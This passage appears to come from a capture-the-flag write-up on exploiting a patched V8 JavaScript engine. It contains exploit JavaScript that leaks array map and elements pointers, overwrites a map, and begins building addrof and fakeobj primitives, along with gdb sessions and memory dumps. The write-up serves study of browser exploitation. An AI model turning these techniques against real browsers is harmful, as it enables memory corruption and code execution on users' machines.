</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// We only get the lower 32 bytes, since that&#39;s what we need because of the pointer compression
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span> <span class="c1">// Lower 32 bits of the Map address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">elem_arr_ptr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span> <span class="c1">//  Lower 32 bits of the elements pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Float array map: 0x&#34;</span> <span class="o">+</span> <span class="nx">flt_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Pointer to array elements: 0x&#34;</span> <span class="o">+</span> <span class="nx">elem_arr_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span></code></pre></div><p>Let&rsquo;s run this script in the release version, as there&rsquo;s no need of the release version I build it for my convenience but use the provided <code>d8</code> binary if you don&rsquo;t want to go through the hassle of building it from scratch.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">.</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">.</span><span class="err">/</span><span class="no">xpl.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff7006700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">12770</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8084e91</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> 
</span></span></code></pre></div><p>Successfully, we leaked the pointers of the <code>JSArrayMap</code> and the element pointer. Now, since we can read the address, it&rsquo;s time to see if it possible to leverage this vulnerability to the <code>addrof</code> and <code>fakeobj</code>, but first let&rsquo;s understand what these are.</p>
<h1 id="jsarraymap" class="relative group"><code>JSArrayMap</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#jsarraymap" aria-label="Anchor">#</a></span></h1><p>Before we first dive into those, we must understand what exactly the <code>map</code> is and what could be even done with this?</p>
<p>Map of an object in JS in context of V8 tells the engine on how the elements are accessed, the reason we have map in the engine because V8 have to be fast enough to access elements, objects and other associated information of the object such that the lookup time would be very less.</p>
<p>According to phrack paper <a href="">here</a>, the map is defined as:-</p>
<hr>
<p>The Map is a key data structure in v8, containing information such as</p>
<ul>
<li>The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, &hellip;</li>
<li>The size of the object in bytes</li>
<li>The properties of the object and where they are stored</li>
<li>The type of the array elements, e.g. unboxed doubles or tagged pointers</li>
<li>The prototype of the object if any</li>
</ul>
<p>While the property names are usually stored in the Map, the property values are stored with the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.</p>
<hr>
<p>It is also mentioned that Maps are very expensive in terms of memory, since V8 have to be faster enough to work through all the objects the Maps are shared and distributed among the objects. So, since we can access the <code>JSArray</code> object map. If we overwrite a <code>JSArray</code>&rsquo;s map we can cause type confusion in the JIT compiler which will lead to unexpected behaviour within the compiler. Now, we have an overall understanding of the what map is, let&rsquo;s try to overwrite the map of the array with any value for a sanity check.</p>
<p>Just add the following line to the <code>xpl.js</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mi">1337</span><span class="nx">n</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span></code></pre></div><p>If you&rsquo;re wondering why <code>3</code> specifically, if you see the above code snippet, we have 3 elements in <code>aux_arr</code> from index <code>0-2</code>, then we call <code>slice</code> on the array with the count being the array, because of the patch we know calling the <code>slice</code> will add 2 more to the length than it originally have, hence allowing us to access map of the array and the element pointer.</p>
<p>Let&rsquo;s run the <code>d8</code> with the <code>xpl.js</code> of ours and see if it worked or not:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.release</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff65fe700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">2403</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8084ec1</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> 
</span></span></code></pre></div><p>It successfully ran, that means it worked. Now, to see if it really worked ot not, we have to analyse the memory, from the leak we know the lower 32 bits of the elements pointer address and with the help of <code>gef</code>&rsquo;s <code>vmmap</code>, we can get isolate root address, with that we can check that the write worked or not.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.release</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff65fe700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">2403</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8084ec1</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="err">^</span><span class="no">C</span>
</span></span><span class="line"><span class="cl"><span class="nf">Thread</span> <span class="mi">1</span> <span class="err">&#34;</span><span class="no">d8</span><span class="err">&#34;</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGINT</span><span class="p">,</span> <span class="no">Interrupt.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span>  <span class="nf">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000365100000000</span> <span class="mi">0x000036510000c000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x000036510000c000</span> <span class="mi">0x0000365100040000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000365100040000</span> <span class="mi">0x0000365100043000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000365100043000</span> <span class="mi">0x0000365100044000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000365100044000</span> <span class="mi">0x0000365100054000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000365100054000</span> <span class="mi">0x000036510007f000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x000036510007f000</span> <span class="mi">0x0000365108040000</span> <span class="mi">0x0000000000000000</span> <span class="p">---</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x0000365108040000</span> <span class="mi">0x000036510805f000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">--</span> <span class="no">snip</span> <span class="p">--</span>
</span></span></code></pre></div><p>The isolate root here is the <code>0x0000365100000000</code>, we can add the lower 32 bits of the elements pointer i.e. <code>0x8084ec1</code> to get the absolute address of the elements pointer, let&rsquo;s see if we successfully overwritten the map or not.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">40</span><span class="no">xg</span> <span class="mi">0x0000365100000000</span> <span class="err">+</span> <span class="mi">0x8084ec1</span>  <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x365108084ec0:</span>	<span class="err">0</span><span class="nf">x0000000608042a31</span>	<span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x365108084ed0:</span>	<span class="err">0</span><span class="nf">x400199999999999a</span>	<span class="mi">0x400a666666666666</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x365108084ee0:</span>	<span class="err">0</span><span class="nf">x0000000a00000539</span>	<span class="mi">0x0000000a08084ec1</span>
</span></span></code></pre></div><p>If you can pay attention to the <code>0x365108084ee0</code> address, we have lower 32 bits address written with <code>0x539</code> which is the hex value of <code>1337</code>. We overwritten the map successfully. Now, it&rsquo;s time to leverage this to get <code>fakeobj</code> and <code>addrof</code> primitive.</p>
<h1 id="fakeobj-and-addrof-primtive" class="relative group"><code>fakeobj</code> and <code>addrof</code> primtive <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fakeobj-and-addrof-primtive" aria-label="Anchor">#</a></span></h1><p>First off, we will go over the <code>addrof</code> primitive, this primitive allow us to read the address of a arbitrary JS Object and on the other hand the <code>fakeobj</code> allow us to inject a fake JS Object into the V8 engine.
Now, we need to replicate these two primitives, let&rsquo;s do it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_obj</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;a&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">aux_obj</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_arr_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">elem_arr_ptr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Float array map: 0x&#34;</span> <span class="o">+</span> <span class="nx">flt_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Pointer to array elements: 0x&#34;</span> <span class="o">+</span> <span class="nx">elem_arr_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">elem_obj_arr</span> <span class="o">=</span> <span class="nx">elem_arr_ptr</span> <span class="o">-</span> <span class="mh">0xc4</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl"><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">elem_obj_arr</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span></code></pre></div><p>What we did here is, retrieve the address of the <code>aux_arr_obj</code> which is the located at the address <code>elem_arr_ptr - 0xc4n</code> then we change the pointer of the elements to that of the object.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff7006700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">4593</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8084f69</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Element</span> <span class="no">Object</span> <span class="no">Array</span><span class="p">:</span> <span class="mi">0x8084ea5</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="nv">%DebugPrint</span><span class="p">(</span><span class="no">aux_obj_arr</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">DebugPrint:</span> <span class="err">0</span><span class="nl">x194f08084eb5:</span> <span class="err">[</span><span class="nf">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">map:</span> <span class="err">0</span><span class="nf">x194f0824394d</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">PACKED_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x194f0820a555</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x194f08084ea9</span> <span class="err">&lt;</span><span class="no">FixedArray</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">PACKED_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">length:</span> <span class="err">1</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">properties:</span> <span class="err">0</span><span class="nf">x194f080426dd</span> <span class="err">&lt;</span><span class="no">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">0</span><span class="nl">x194f08044649:</span> <span class="err">[</span><span class="nf">String</span><span class="p">]</span> <span class="no">in</span> <span class="no">ReadOnlySpace</span><span class="p">:</span> <span class="c1">#length: 0x194f08182159 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">}</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x194f08084ea9</span> <span class="err">&lt;</span><span class="no">FixedArray</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">           <span class="err">0:</span> <span class="err">0</span><span class="nf">x194f08084e7d</span> <span class="err">&lt;</span><span class="no">Object</span> <span class="no">map</span> <span class="err">=</span> <span class="mi">0x194f0824579d</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x194f0824394d:</span> <span class="err">[</span><span class="nf">Map</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">type:</span> <span class="nf">JS_ARRAY_TYPE</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">size</span><span class="p">:</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">inobject</span> <span class="no">properties</span><span class="p">:</span> <span class="mi">0</span>
